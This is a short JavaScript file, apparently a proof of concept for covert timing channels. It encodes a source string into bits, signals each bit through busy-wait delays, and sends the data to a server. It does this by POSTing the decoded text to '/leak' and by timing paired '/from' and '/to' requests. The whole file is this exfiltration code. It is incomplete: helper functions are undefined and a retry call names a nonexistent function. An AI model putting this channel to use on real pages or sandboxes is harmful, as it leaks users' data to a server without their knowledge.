function wait() {
    for (var i = 0; i < 10000000; i++) {
        b = Math.sin(Math.random());
    }
}

function leakTimeBit(b) {
    var start = Date.now();
    if (b) wait();
    var end = Date.now();
    return end - start > 0;
}

function leakTime(src, tries) {
    var bits = encode(src);
    var leaked = bits.map(leakTimeBit);
    diff(bits, leaked);
    var dec = decode(leaked);
    if (dec) {
        $.post('/leak', {txt: dec});
    } else {
        if (tries < 12) leak(src, tries + 1);
    }
}

function leakNetBit(ses, bit, i) {
    $.post('/from', {ses: ses, i: i});
    if (bit) wait();
    $.post('/to', {ses: ses, i: i});
}

function leakNet(src) {
    // init session and tune delay
    var ses = 0|(64 * Math.random());
    $.post('/init', {ses: ses, l: src.length});
    wait();
    var bits = encode(src);
    for (var i = 0; i < bits.length; i++) {
        leakNetBit(ses, bits[i], i);
    }
}
